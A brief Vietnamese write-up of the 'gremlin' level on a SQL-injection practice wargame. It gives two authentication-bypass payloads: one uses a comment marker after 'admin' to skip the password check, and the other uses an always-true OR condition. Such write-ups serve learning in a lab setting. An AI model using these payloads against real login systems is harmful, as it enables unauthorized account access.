
gremlins

```
https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=admin'--&pw='123'
```
- sau dấu -- là hần cmt đã đóng lại sẽ lấy được tài khoản mà không cần mật khẩu
=> Giả vờ đăng nhập với id=admin, sau đó dùng comment để bỏ qua mật khẩu.
- hoặc là dùng 
```
id=' or '1'='1'--&pw='123' => trả ra kết quả luôn đúng
```
=> Không cần biết tài khoản gì, chỉ cần tạo điều kiện logic luôn đúng để query trả về kết quả.
